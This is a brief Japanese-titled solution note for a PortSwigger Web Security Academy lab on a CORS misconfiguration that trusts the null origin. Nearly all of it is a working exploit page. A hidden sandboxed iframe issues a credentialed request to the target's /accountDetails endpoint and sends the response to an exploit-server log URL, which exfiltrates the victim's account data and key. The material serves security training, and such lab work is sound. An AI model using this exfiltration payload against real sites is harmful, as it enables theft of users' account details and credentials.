# 信頼できる null オリジンによる CORS の脆弱性
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
```html
<html>
  <body>
    <iframe style="display: none" sandbox="allow-scripts"
    srcdoc="
    <script>
        var xhr = new XMLHttpRequest();
        var url = "https://0a74008f04ed5888809304a5004d0053.web-security-academy.net";

        xhr.onreadystatechange = function () {
          if (xhr.readyState == XMLHttpRequest.DONE) {
            fetch("https://exploit-0af000610409589e80b502ec01940012.exploit-server.net/exploit/log?key=" + xhr.responseText);
          }
        };
        xhr.open("GET", url + "/accountDetails", true);
        xhr.withCredentials = true;
        xhr.send(null);
    </script>"></iframe>
  </body>
</html>
```
